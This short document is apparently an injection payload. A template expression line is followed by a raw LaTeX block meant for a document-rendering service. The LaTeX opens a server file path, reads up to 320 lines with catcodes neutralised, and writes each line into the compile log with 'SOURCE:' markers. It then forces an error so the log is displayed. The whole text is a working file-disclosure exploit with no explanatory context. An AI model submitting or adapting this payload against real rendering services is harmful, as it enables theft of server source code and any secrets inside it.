{{ overrides | merge(defaults) | json }}

```{=latex}
\newread\leak
\newcount\linecount
\openin\leak=/home/webadmin/aegis/routes/mds_diag.js
\ifeof\leak
  \typeout{AEGIS-MISS:mds-diag-source}
\else
  \typeout{AEGIS-HIT:mds-diag-source}
  \linecount=0
  \def\readnext{
    \ifeof\leak
      \let\next\relax
    \else
      \read\leak to \leakline
      \advance\linecount by 1
      \typeout{SOURCE:\the\linecount:\leakline}
      \ifnum\linecount<320
        \let\next\readnext
      \else
        \let\next\relax
      \fi
    \fi
    \next
  }
  \def\startsaferead{
    \begingroup
    \catcode35=12
    \catcode36=12
    \catcode37=12
    \catcode38=12
    \catcode92=12
    \catcode94=12
    \catcode95=12
    \catcode123=12
    \catcode125=12
    \catcode126=12
    \readnext
    \endgroup
  }
  \startsaferead
\fi
\closein\leak
\errmessage{AEGIS-FORCE-DIAGNOSTIC}
\mbox{}
```
